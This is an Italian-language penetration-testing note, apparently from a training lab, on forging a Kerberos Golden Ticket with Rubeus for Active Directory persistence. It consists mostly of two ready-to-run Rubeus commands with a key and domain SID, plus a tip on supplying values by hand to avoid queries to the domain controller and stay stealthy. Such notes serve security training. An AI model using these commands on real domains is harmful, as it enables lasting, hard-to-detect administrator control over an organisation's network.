# Persitence - Golden Ticket - Rubeus

* Utilizza Rubeus per forgiare un Golden Ticket con attributi simili a un normal TGT

{% code fullWidth="true" %}
```powershell
C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```
{% endcode %}

* Il comando precedente genera forgia il ticket. Notare che 3 LDAP query vengono eseguite sul DC per recuperare i seguenti valori:
  * Recuperare Flag per l'utente specificato in /user
  * Recuperare /groups /pgid /minpassage e /maxpassage&#x20;
  * Recuperare /netbios del dominio attuale

#### Se si sono gia' enumerati i valori descritti in precedenza, ebbene specificarne quanti piu possibile nel commando di forging di sopra, cosi da evitare chiamate dirette al DC risultando piu' OPSEC

* Il comando per forgiare il Golden Ticket con i valori inseriti manualmente risulta il seguente

```powershell
C:\AD\Tools\Rubeus.exe golden
/aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA84
8 /user:Administrator /id:500 /pgid:513
/domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-
3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1
/logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-
DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
/ptt
```
